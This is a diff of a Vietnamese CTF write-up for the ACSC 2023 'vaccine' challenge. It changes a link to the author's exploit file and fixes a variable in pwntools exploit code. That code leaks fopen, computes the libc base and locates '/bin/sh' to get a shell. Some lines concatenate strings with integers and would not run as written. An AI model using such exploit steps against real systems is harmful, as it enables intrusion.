@@ -122,7 +122,7 @@ Tới đây ta dùng one_gadgets để mọi việc dễ dàng hơn (thật ra l
 
 # 4. Chiếm cờ:
 
-Đây là toàn bộ file exploit của mình: [asd.py](https://github.com/w1n-gl0ry/CTF/blob/282b01d2218753947b6b7ae75d8f3fc29d1daf3e/2023/ACSC_2023/vaccine/asd.py)
+Đây là toàn bộ file exploit của mình: [asd.py](https://github.com/w1n-gl0ry/CTF/blob/0da95eda4b2c9730eabe7473c6dbf1fe7e87f927/2023/ACSC_2023/vaccine/asd.py)
 ```
 #!/usr/bin/python3
 from pwn import *
@@ -156,7 +156,7 @@ leak = r.recv()
 fopen_leak = u64(leak[:6].ljust(8, b"\x00"))
 log.info('fopen_leak: ' + fopen_leak)
 
-libc_base = libc_leak - libc.symbols['fopen']
+libc_base = fopen_leak - libc.symbols['fopen']
 log.info('libc_base: ' + libc_base)
 
 bin_sh = libc_base + next(libc.search(b"/bin/sh\x00"))
